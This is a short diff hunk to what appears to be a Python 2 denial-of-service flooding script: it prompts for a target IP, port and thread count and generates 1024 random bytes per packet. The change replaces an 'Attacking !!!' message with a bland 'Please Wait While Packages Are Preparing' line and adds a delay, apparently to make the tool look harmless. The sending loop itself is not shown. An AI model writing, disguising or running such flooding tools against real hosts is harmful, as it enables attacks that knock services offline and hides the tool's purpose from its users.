@@ -6,7 +6,8 @@ import time
 ip = raw_input("IP : ")
 port = input("Port : ")
 thread_num = input("Threads : ")
-print "Attacking !!! Thread:",thread_num
+print "Please Wait While Packages Are Preparing Thread :",thread_num
+time.sleep(5)
 
 def run():
 	bytes = random._urandom(1024)
